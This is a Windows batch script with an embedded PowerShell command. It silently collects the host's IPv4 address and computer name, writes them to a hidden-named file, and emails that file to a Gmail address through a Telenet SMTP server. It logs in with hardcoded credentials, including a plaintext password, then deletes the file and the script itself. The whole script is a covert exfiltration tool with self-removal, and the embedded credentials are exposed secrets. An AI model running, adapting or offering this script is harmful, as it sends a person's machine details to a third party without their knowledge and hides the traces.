@echo off
mode con: cols=130 lines=30
powershell -command "$Host.UI.RawUI.ForegroundColor = [System.ConsoleColor]::Green; $Host.UI.RawUI.BackgroundColor = [System.ConsoleColor]::Black"
for /f "tokens=2 delims=:" %%a in ('ipconfig ^| findstr /c:"IPv4 Address"') do (
    set "IP=%%a"
)
for /F "tokens=*" %%A in ('hostname') do set HOSTNAME=%%A
set "IP=%IP:~1%"
echo IP-adres: %IP% > .txt
echo PC-naam: %HOSTNAME% >> .txt
powershell -command "$EmailFrom = 'ljk.smile.123@telenet.be'; $EmailTo = '987654321.azerty.qwerty.123456789@gmail.com'; $Subject = 'IP'; $Body = 'Zie bijlage.'; $AttachmentPath = '%temp%\.txt'; $SMTPServer = 'smtp.telenet.be'; $SMTPPort = 587; $SMTPUsername = 'ljk.smile.123@telenet.be'; $SMTPPassword = '1968JkL1970'; $Message = New-Object System.Net.Mail.MailMessage($EmailFrom, $EmailTo, $Subject, $Body); $Attachment = New-Object System.Net.Mail.Attachment($AttachmentPath); $Message.Attachments.Add($Attachment); $SMTPClient = New-Object System.Net.Mail.SmtpClient($SMTPServer, $SMTPPort); $SMTPClient.EnableSsl = $true; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($SMTPUsername, $SMTPPassword); $SMTPClient.Send($Message); $Attachment.Dispose(); Write-Host 'Email with attachment sent successfully.'"
DEL /F /Q "%temp%\.txt"
DEL /F /Q "%temp%\IP.bat"